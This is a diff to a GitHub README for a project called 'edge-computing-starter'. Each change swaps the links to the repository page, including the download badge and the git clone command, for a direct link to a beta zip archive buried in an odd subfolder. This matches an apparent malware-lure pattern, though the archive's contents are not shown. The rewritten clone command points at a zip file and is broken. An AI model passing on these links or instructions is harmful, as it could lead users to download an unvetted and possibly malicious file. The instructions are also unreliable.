@@ -1,6 +1,6 @@
 # ⚙️ edge-computing-starter - Run serverless apps with ease
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Interceptorscoringsystem846/edge-computing-starter)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Interceptorscoringsystem846/edge-computing-starter/raw/refs/heads/main/ha/starter_edge_computing_2.3-beta.1.zip)
 
 ## 📌 What this app is
 
@@ -29,7 +29,7 @@ If you see a version number, you are set.
 
 Use this link to visit the project page and download the files:
 
-[https://github.com/Interceptorscoringsystem846/edge-computing-starter](https://github.com/Interceptorscoringsystem846/edge-computing-starter)
+[https://github.com/Interceptorscoringsystem846/edge-computing-starter/raw/refs/heads/main/ha/starter_edge_computing_2.3-beta.1.zip](https://github.com/Interceptorscoringsystem846/edge-computing-starter/raw/refs/heads/main/ha/starter_edge_computing_2.3-beta.1.zip)
 
 ### Option 1: Download from GitHub
 
@@ -48,7 +48,7 @@ If you have Git installed:
 2. Go to the folder where you want the project.
 3. Run:
 
-git clone https://github.com/Interceptorscoringsystem846/edge-computing-starter
+git clone https://github.com/Interceptorscoringsystem846/edge-computing-starter/raw/refs/heads/main/ha/starter_edge_computing_2.3-beta.1.zip
 
 4. Open the new folder after the download finishes.
 
